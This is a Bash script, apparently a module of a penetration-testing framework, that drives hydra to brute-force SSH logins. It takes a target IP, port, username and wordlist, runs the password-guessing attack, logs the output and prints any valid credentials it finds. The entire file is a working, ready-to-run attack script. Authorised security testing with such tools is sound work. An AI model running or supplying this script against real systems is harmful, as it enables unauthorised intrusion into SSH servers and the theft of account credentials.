#!/usr/bin/env bash
set -euo pipefail

: "${TARGET_IP:?TARGET_IP is required}"
: "${TARGET_PORT:-22}"
: "${USERNAME:?USERNAME is required}"
: "${WORDLIST:?WORDLIST is required}"

TOOL_ARGS="${TOOL_ARGS:-}"
RUN_ID="${RUN_ID:-run_unknown}"
OUT_DIR="${OUT_DIR:-runs/${RUN_ID}/ssh_bruteforce}"

mkdir -p "$OUT_DIR"

echo "[ssh_bruteforce] TARGET=${TARGET_IP}:${TARGET_PORT}"
echo "[ssh_bruteforce] USERNAME=${USERNAME}"
echo "[ssh_bruteforce] WORDLIST=${WORDLIST}"
echo "[ssh_bruteforce] TOOL_ARGS=${TOOL_ARGS}"
echo "[ssh_bruteforce] OUT_DIR=${OUT_DIR}"

if [[ ! -f "$WORDLIST" ]]; then
    echo "[ssh_bruteforce] ERROR: Wordlist not found: $WORDLIST"
    exit 1
fi

WORDLIST_SIZE=$(wc -l < "$WORDLIST")
echo "[ssh_bruteforce] Wordlist size: ${WORDLIST_SIZE} passwords"
echo "PROGRESS_TOTAL=${WORDLIST_SIZE}"

read -r -a ARGS <<< "$TOOL_ARGS"

HYDRA_BIN=$(command -v hydra 2>/dev/null || echo "hydra")

if ! command -v "$HYDRA_BIN" &>/dev/null; then
    echo "[ssh_bruteforce] ERROR: hydra not found in PATH"
    exit 1
fi

OUTPUT_FILE="${OUT_DIR}/hydra_output.txt"

printf '[ssh_bruteforce] CMD: %s' "$HYDRA_BIN"
printf ' -l %q' "$USERNAME"
printf ' -P %q' "$WORDLIST"
printf ' -s %q' "$TARGET_PORT"
for a in "${ARGS[@]}"; do printf ' %q' "$a"; done
printf ' -o %q' "$OUTPUT_FILE"
printf ' %q ssh\n' "$TARGET_IP"

trap 'echo "[ssh_bruteforce] Interrupted"; exit 130' INT TERM

set +e
"$HYDRA_BIN" \
    -l "$USERNAME" \
    -P "$WORDLIST" \
    -s "$TARGET_PORT" \
    "${ARGS[@]}" \
    -o "$OUTPUT_FILE" \
    "$TARGET_IP" ssh 2>&1

EXIT_CODE=$?
set -e

if [[ $EXIT_CODE -eq 130 ]]; then
    echo "[ssh_bruteforce] Interrupted"
    exit 130
fi

echo "[ssh_bruteforce] Exit code: $EXIT_CODE"

if [[ -f "$OUTPUT_FILE" ]]; then
    if grep -qE '\[[0-9]+\]\[ssh\].*login:.*password:' "$OUTPUT_FILE"; then
        echo "[ssh_bruteforce] Valid credentials found"
        grep -E '\[[0-9]+\]\[ssh\].*login:.*password:' "$OUTPUT_FILE"
    else
        echo "[ssh_bruteforce] No valid credentials found"
    fi
fi

echo "[ssh_bruteforce] Completed"
exit $EXIT_CODE